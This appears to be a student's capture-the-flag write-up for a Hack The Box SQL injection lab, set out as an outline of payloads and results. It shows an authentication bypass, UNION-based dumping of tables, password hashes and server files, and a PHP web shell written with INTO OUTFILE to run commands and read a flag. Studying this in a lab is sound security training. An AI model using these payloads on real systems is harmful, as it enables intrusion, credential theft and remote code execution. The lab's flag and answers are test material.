---
tags: [CWES, HTB, technical-reference]
module: "SQL Injection Fundamentals"
source_file: "CWES.xmind"
---

# Skills Assessment

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## on Create new account page

### needs 4 input one of them is invitation code

- disable Javascript to bypass front end filtering
- all the 4 input fileds used SQLI payloads (buttering ram intruder)
  - got result
    ![[Attachments/8e1cf9aa0c10d7f57b567a03bf36d3f283c0b63f54cc5d96c0fb40db93d00629.png]]
    - username=ryadmin&password=Aa@13579@#&repeatPassword=Aa@13579@#&invitationCode=abcd-efgh-1234admin'%20or%20'1'%3d'1
      - Login as
        - ryadmin:Aa@13579@#
## After login

### We have chats with many users the user named @chatter i choose to speak to

- send chat function
  - try malicious payloads
- search in chat function
  - try malicious payloads
    - found working payload
      - something')union select 1,2,3,4#
        - 3
          - now replace 3
            - something')union select 1,2,@@version,4#
              - 10.11.11-MariaDB-0+deb12u1
## get the hash of admin user

### read system files

- something')union select 1,2,LOAD_FILE("/etc/passwd"),4#
  - admin user was not one of them
### read the database

- get the schema name
  - something')union select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA#
    - information_schema
    - chattr
- get the tables name
  - something')union select 1,2,TABLE_NAME,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'#
    - Users
    - InvitationCodes
    - Messages
- get the columns name
  - something')union select 1,2,COLUMN_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='Users'#
    - UserID
    - Username
    - Password
    - InvitationCode
    - AccountCreated
- extract usernsnames
  - something')UNION select 1, 2, Username, 4 from chattr.Users#
    - aadmin' or '1'='1
      - Created by intruder
    - aadmin') or '1'='1'#
      - Created by intruder
    - aadmin') or ('1'='1
      - Created by intruder
    - aadmin'or 1=1 or ''='
      - Created by intruder
    - admin
      - Fifth one
- extract the hash
  - something')UNION select 1, 2, Password, 4 from chattr.Users#
    - $argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
      - This was the answer since the admin UserId is = 1
    - $argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4
    - $argon2i$v=19$m=2048,t=4,p=3$TGxqYzFCemxBL3dFSkNwRQ$MQ6sZ+WbyTC2YY3GMGhsSXDhg7+oGWoOGvG8caw47Nc
    - $argon2i$v=19$m=2048,t=4,p=3$UzY3d1FGclBNQThCTTBmUw$wbFe74g6vSKuTGXnL4eBeNSeKS+9kya/OMJRS1Gfs50
    - $argon2i$v=19$m=2048,t=4,p=3$U1NXS3ZhSENPaExsZFJBaw$lKPqFXoVbBaFDchKsdfDdR5UKXedIhzcJw0R3sZMbfM
## what is the path of web application ?

### Database path

- something')UNION select 1, 2, @@datadir, 4 from chattr.Users#
  - /var/lib/mysql/
### web server configuration file

- something')UNION select 1, 2, LOAD_FILE("/etc/nginx/nginx.conf"), 4 from chattr.Users#
- something')UNION select 1, 2, LOAD_FILE('/etc/nginx/sites-enabled/default'), 4 from chattr.Users#
  - ..../var/www/chattr-prod.....
## Achive RCE and get the flag

### something')UNION select 1, 2,'<?<!-- -->php sys<!-- -->tem($_REQUEST[0]); ?>', 4 into outfile '/var/www/chattr-prod/shell.php'#

- https://83.136.254.49:43385/shell.php?0=id
  - uid=33(www-data) gid=33(www-data) groups=33(www-data) 4
- https://83.136.254.49:43385/shell.php?0=ls+/
  - flag_876a4c.txt
    - web user dosent have permissions
### something')UNION select 1, 2, LOAD_FILE("/flag_876a4c.txt"), 4 from chattr.Users#

- 061b1aeb94dec6bf5d9c27032b3c1d8d
